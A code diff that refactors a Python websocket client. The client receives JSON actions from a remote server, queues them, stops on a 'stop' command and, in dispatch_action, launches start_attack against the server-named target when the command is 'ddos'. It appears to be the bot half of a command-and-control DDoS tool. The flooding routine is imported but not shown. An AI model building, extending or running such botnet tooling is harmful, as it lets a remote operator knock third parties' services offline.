@@ -1,27 +1,45 @@
-from typing import Union
 import json
+
+from asyncio import Queue
+from models import Action
 from sanic.server.websockets.impl import WebsocketImplProtocol
-from lib.utils import wait_for
-from models import Action, BaseCommand
+
+from scripts.exceptions import CannotGetActionFromServerException
+from scripts.services.attack_services import start_attack
+from pydantic import ValidationError
 
 
-async def get_command_from_server(ws: WebsocketImplProtocol):
-    return BaseCommand(**json.loads(await ws.recv()))
-
-
-async def wait_for_command_from_server(ws: WebsocketImplProtocol):
-    return await wait_for(get_command_from_server(ws), 0.1)
-
-
-async def get_action(ws: WebsocketImplProtocol) -> Union[Action, None]:
+async def get_action_from_server(ws: WebsocketImplProtocol) -> Action:
     response = json.loads(await ws.recv())
-    return Action(**response.get('action'))
+    raw_action = response.get('action')
+    if raw_action is None:
+        raise CannotGetActionFromServerException(response=response)
+
+    return Action(**raw_action)
 
 
-async def is_needed_to_stop(command: BaseCommand) -> bool:
-    if command.title == 'stop':
+async def wait_for_actions_from_server(ws: WebsocketImplProtocol, queue: Queue):
+    """
+        Waits for the server to send an action, and puts this action into <queue>
+        Raises CannotGetActionFromServerException if server sent a bad action
+    """
+    while True:
+        try:
+            await queue.put(await get_action_from_server(ws))
+        except ValidationError as e:
+            raise CannotGetActionFromServerException(validation_errors=e.errors())
+
+
+async def is_needed_to_stop(action: Action) -> bool:
+    """Returns True if action is stop"""
+    if action.command.title == 'stop':
         return True
     return False
+
+
+async def dispatch_action(action: Action):
+    if action.command.title == 'ddos':
+        await start_attack(action.target)
 
 
 
